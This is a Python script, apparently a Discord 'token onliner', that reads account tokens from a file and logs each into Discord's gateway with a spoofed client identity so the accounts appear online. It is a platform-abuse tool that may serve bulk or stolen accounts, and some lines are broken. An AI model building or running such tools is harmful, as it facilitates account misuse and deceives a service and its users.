import requests
import pystyle 
import websocket
import time
from pystyle import Colorate, Colors, Center
import json
from ctypes import windll
from datetime import datetime
import os
import colorama
from colorama import Fore
erba = Fore.GREEN
class sockett:
    def __init__(self):
        self.ws = websocket.WebSocket()
        self.gateway_url = 'wss://gateway.discord.gg/?v=10&encoding=json'
    def headers(self):
        headers=headers
    def connect(self):
        self.ws.connect(self.gateway_url)

    def send(self, data):
        self.ws.send(json.dumps(data))

    def receive(self):
        return json.loads(self.ws.recv())

    def close(self):
        self.ws.close()

    def identify(self, token, game=None):
        game_json = {"name": game, "type": 0} if game else None
        payload = {
            "op": 2,
            "d": {
                "token": token,
                "capabilities": 8189,
                "properties": {
                    "os": "Windows",
                    "browser": "Discord Client",
                    "device": "",
                    "system_locale": "en-GB",
                    "browser_user_agent": "Custom User Agent",
                    "browser_version": "1.0.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": 0,
                    "client_event_source": None,
                    "design_id": 0,
                },
                "presence": {
                    "activities": [game_json] if game_json else [],
                    "status": "online",
                    "since": 0,
                    "afk": False,
                },
                "compress": False,
                "client_state": {
                    "guild_versions": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1,
                    "user_settings_version": -1,
                    "private_channels_version": "0",
                    "api_code_version": 0,
                },
            },
        }
        self.send(payload)

    def get_session_id(self):
        for _ in range(5):
            try:
                response = self.receive()
                return response['d']['session_id']
            except KeyError:
                pass
        return None

    def run(self, token, game=None):
        self.connect()
        self.identify(token, game)

class onliner:
    @staticmethod
    def tokenonliner():
        try:
            with open('tokens.txt', 'r') as file:
                tokens = [token.strip() for token in file.readlines()]

            if not tokens:
                print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(f"No tokens to process.")))
                return
            
            time.sleep(5)

            for token in tokens:
                socket = sockett()
                socket.run(token)
                print(Colorate.Horizontal(Colors.green_to_yellow, Center.XCenter(f'\n[+] {token} onlined')))

        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(f"A Error occurred: {e}")))


tokens = [token.strip() for token in open('tokens.txt', 'r').readlines()]

def main():
    windll.kernel32.SetConsoleTitleW(f'Token onliner       |       Time: {datetime.now().strftime('%H:%M:%S')}       |       Telegram: @stronzogigante       |       Github: quelloduro       |       Leave a star or i fuck u <3')
    os.system('cls')
    print(Center.XCenter(f'''{erba}


   ___              _       _                            
  / _ \   _ _      | |     (_)    _ _      ___      _ _  
 | (_) | | ' \     | |     | |   | ' \    / -_)    | '_| 
  \___/  |_||_|   _|_|_   _|_|_  |_||_|   \___|   _|_|_  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 


                        Tokens: {len(tokens)}
                                                
              Press enter to start the tool


    '''))
    input()
    onliner_instance = onliner()  
    onliner_instance.tokenonliner()    
    input()

if __name__ == "__main__":
    while True:      
        main()